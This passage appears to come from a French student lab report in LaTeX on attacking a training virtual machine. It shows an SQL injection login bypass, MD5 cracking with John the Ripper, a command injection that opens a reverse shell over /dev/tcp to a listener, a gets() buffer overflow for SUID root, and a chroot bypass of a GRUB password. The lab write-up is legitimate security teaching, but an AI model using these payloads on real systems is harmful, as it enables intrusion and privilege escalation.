...
\begin{center}
\includegraphics[width=0.85\textwidth]{images/xss-1.png}
...
\begin{center}
\includegraphics[width=0.85\textwidth]{images/xss-script.png}
...
L'accès à la base de données a été obtenu par une injection SQL dans le formulaire de connexion. En saisissant la chaîne \texttt{admin' \#} dans le champ utilisateur, le caractère \texttt{'} ferme la requête et le caractère \texttt{\#} met la suite en commentaire.
...
Une fois le hash MD5 récupéré, nous avons effectué une attaque par dictionnaire avec \textbf{John the Ripper} et la liste \texttt{rockyou.txt}.

\begin{center}
\includegraphics[width=0.85\textwidth]{images/4.2.png}
\end{center}

\subsection{Récupération de controller.c via SSH [/1]}
La connexion SSH au compte de Carol a permis de valider l'accès et de récupérer le code source de \texttt{controller.c}.
...
Un reverse shell a été obtenu en exploitant une faille dans \texttt{toggleService.php}. En injectant la commande : \\
\texttt{; bash -i >\& /dev/tcp/10.22.0.1/4444 0>\&1} \\
nous avons forcé le serveur à se connecter à notre écouteur Netcat.
...
Le programme utilise la fonction \texttt{gets()}, qui ne vérifie pas la taille des données lues. Cela permet d'écraser la variable \texttt{servicePath} sur la pile et de détourner l'exécution vers un shell root.

\subsection{Exploitation du buffer overflow pour devenir root [/2]}
En envoyant 64 octets de remplissage suivis de \texttt{/bin/sh}, nous avons obtenu un accès root immédiat grâce au bit SUID.
...
Nous avons monté le disque virtuel \texttt{TP2-disk001.vdi} sur Kali Linux. L'utilisation de \texttt{sudo chroot /mnt/tp /bin/bash} nous a permis de devenir root sans mot de passe GRUB.
...
\bibitem{kali} Kali Linux Documentation. \url{https://www.kali.org/docs/}
\bibitem{owasp} OWASP SQL Injection Guide. \url{https://owasp.org/www-community/attacks/SQL_Injection}
\end{thebibliography}
